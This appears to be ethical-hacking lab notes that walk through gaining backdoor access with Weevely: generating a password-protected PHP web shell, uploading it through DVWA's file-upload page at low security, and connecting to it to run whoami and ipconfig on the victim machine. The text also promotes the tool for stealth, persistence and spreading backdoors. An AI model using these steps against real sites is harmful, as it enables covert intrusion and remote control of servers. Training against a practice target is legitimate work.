- Gaining backdoor access refers to entering a website in a stealthy way. These Backdoors are often installed via some unvalidated uploads. This vulnerability allows you to upload harmful files to the target web server. Websites that are developed using PHP are often susceptible to this kind of attack.

- A professional ethical hacker or pen tester can use tools such as Weevely to gain backdoor access to a website without being traced. Weevely is used to develop a backdoor shell and upload it to a target server in order to gain remote shell access. This tool also helps in performing administrative tasks, maintaining persistence, and spreading backdoors across the target network.

- Here, we will gain backdoor access via a web shell using Weevely.
- Open Terminal
	>weevely generate #password #filepath 
	- (here, the password is **toor**, and the file path is **/home/attacker/Desktop/shell.php**) and press **Enter** to generate a shell file.

- Click the **Firefox** icon from the top section of **Desktop**, type **http://10.10.10.16:8080/dvwa/login.php**. Into the address bar and press **Enter** and login.
- Change the **Security Level** from impossible to low by selecting **Low** from the drop-down list and clicking the **Submit** button.
- Click the **File Upload** option from the left pane.
- The **Vulnerability: File Upload** page appears. Click the **Browse…** button to upload a file.
- The **File Upload** window appears; navigate to the **Desktop** location, select the payload file **shell.php**, and click **Open**.
- Now, click the **Upload** button to upload the file to the database.
- You will see a message that the file has successfully been uploaded, with the location of the file. Note the location of the file and minimize the browser window.
- Open Terminal
	> weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php #password (This command establishes a connection with the payload and interacts with the target)
	
	- You can observe that a session has successfully been established with the victim system.
	- Now, type **whoami** and press **Enter** to view the system details of the victim machine.
	- The result appears, displaying the running system privileges and the present working directory.
	- Now, type **ipconfig** and press **Enter** to view the IP configuration of the victim machine.
	- The result appears, displaying the victim machine’s IP address, default gateway, Ipv6 address, and other information.